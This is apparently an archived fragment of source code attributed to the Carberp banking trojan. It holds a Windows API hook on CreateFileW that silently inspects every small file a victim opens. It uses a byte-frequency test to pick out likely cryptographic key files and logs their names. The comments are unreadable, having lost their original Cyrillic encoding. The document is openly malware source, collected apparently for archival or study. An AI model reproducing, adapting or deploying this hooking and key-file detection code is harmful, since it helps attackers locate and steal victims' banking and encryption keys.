/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
HANDLE WINAPI Hook_CreateFileW( LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile )
{
	HANDLE hRet = Real_CreateFileW( lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile );
	//���� ����������� ��� ������
	if( (dwDesiredAccess & GENERIC_READ) &&  dwCreationDisposition == OPEN_EXISTING )
	{
		//��������� �������� ��� �������
		HANDLE hFile = Real_CreateFileW( lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile );
		if ( hFile != INVALID_HANDLE_VALUE )
		{		
			DWORD h;
			DWORD dwFileSize = (DWORD)pGetFileSize( hFile, &h );
			//������ ��������
			if( dwFileSize > 500 && dwFileSize < 3000 )
			{
				//������ �������� � ������
				HANDLE hMapFile = (HANDLE)pCreateFileMappingW( hFile, 0, PAGE_READONLY, 0, dwFileSize, 0 );
				LPBYTE pbyFile  = NULL;
				if ( hMapFile != INVALID_HANDLE_VALUE )
				{
					LPBYTE pbyFile = (LPBYTE)pMapViewOfFile( hMapFile, FILE_MAP_READ, 0, 0, 0 );
					if ( pbyFile != NULL )
					{
						//�� zip (jar) �����
						if( pbyFile[0] != 'P' || pbyFile[1] != 'K' )
						{
							//������� ������� ��������
							int s[256];
							m_memset( s, 0, sizeof(s) );
							for( int i = 0; i < dwFileSize; i++ ) s[pbyFile[i]]++;
							//������� ������� �������
							int avg = dwFileSize / 256;
							//������ � ����� ��������� ���������� �������������� ������
							int min = avg - avg / 2 - 1; if( min <= 0 ) min = 1;
							int max = avg + avg / 2 + 1;
							//������������ ���������� ��������� ������ � ��������� [m1;m2]
							int m1 = 0, m2 = 0;
							for( int i = 0; i < 256; i++ )
								if( min <= s[i] && s[i] <= max ) 
									m1++;
								else
									m2++;
						        //���� ������� ���������� ������������, �� ���������� ��������� 
						        //������ ���� �������� � ��� ���� ������
							if( m1 / 2 > m2 )
							{
								OutputDebugString("key file");
								OutputDebugStringW(lpFileName);
							}
						}
						pUnmapViewOfFile( pbyFile );
					}
					pZwClose( hMapFile );
				}
			}	
			pZwClose( hFile );	
		}
	}
	return hRet;
}
